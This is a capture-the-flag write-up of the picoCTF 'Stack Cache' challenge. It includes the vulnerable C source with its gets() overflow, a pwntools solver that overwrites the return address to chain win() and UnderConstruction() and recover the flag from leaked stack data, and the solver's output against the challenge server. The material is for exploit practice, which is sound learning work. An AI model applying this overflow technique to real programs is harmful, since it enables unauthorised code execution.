### stack cache

Download the files and run `file vuln`.

```bash
➜  Stack Cache git:(main) ✗ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=a6f5a5dc67a64d6f276855a06f3333ee1d4bc3d8, for GNU/Linux 3.2.0, not stripped
```

We see that this binary is `statically linked`, meaning we cannot perform `ret2libc` attack. 

Taking a look at the `.c`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 16
#define FLAGSIZE 64
#define INPSIZE 10

/*
This program is compiled statically with clang-12
without any optimisations.
*/

void win() {
  char buf[FLAGSIZE];
  char filler[BUFSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
}

void UnderConstruction() {
        // this function is under construction
        char consideration[BUFSIZE];
        char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = "Enter names";
	// *q = "Name 1";
	// *r = "Name 2";
        unsigned long *age;
	printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents);
	printf("Names of user: %p %p %p\n", p,q,r);
        printf("Age of user: %p\n",age);
        fflush(stdout);
}

void vuln(){
   char buf[INPSIZE];
   printf("Give me a string that gets you the flag\n");
   gets(buf);
   printf("%s\n",buf);
   return;
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  printf("Bye!");
  return 0;
}
```

There are 3 key points in this code:

* A `gets` function that leads to buffer overflow.
* A `win()` function that reads but does not print the flag.
* An `UnderConstruction()` function that prints pointers on the screen.

The pointers are not initialized so the `printf` function will print whatever seems to be on the stack this moment. We can tamper with the stack with the `win()` function to place the flag there. After that, we simply call `UnderConstruction` to print it. 

#### Solution

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './vuln' 

LOCAL = False

if LOCAL:
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)

e = ELF(fname)

def convert_flag(flag):
  conv = ''
  for i in flag:
    try:
      conv += binascii.unhexlify(i[2:]).decode()
    except: 
      pass
  return conv

r.sendline(b'A'*14 + p32(e.sym.win) + p32(e.sym.UnderConstruction))

# Split flag in 3 parts
r.recvuntil('information : ')
flag1 = r.recvline()[:-1].decode().split(' ')
r.recvuntil('Names of user: ')
flag2 = r.recvline()[:-1].decode().split(' ')
r.recvuntil('Age of user: ')
flag3 = r.recvline()[:-1].decode().split(' ')

# Convert them to ASCII
flag  = convert_flag(flag1)
flag += convert_flag(flag2)
flag += convert_flag(flag3)

print(f'\nFlag --> {flag[::-1]}}}\n')
```

```bash
➜  Stack Cache git:(main) ✗ python solver.py saturn.picoctf.net 54493
[+] Opening connection to saturn.picoctf.net on port 54493: Done
[*] '/home/w3th4nds/github/Pico-CTF-Practice/Binary-Exploitation/Stack Cache/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

Flag --> picoCTF{XXX}

[*] Closed connection to saturn.picoctf.net port 54493
```
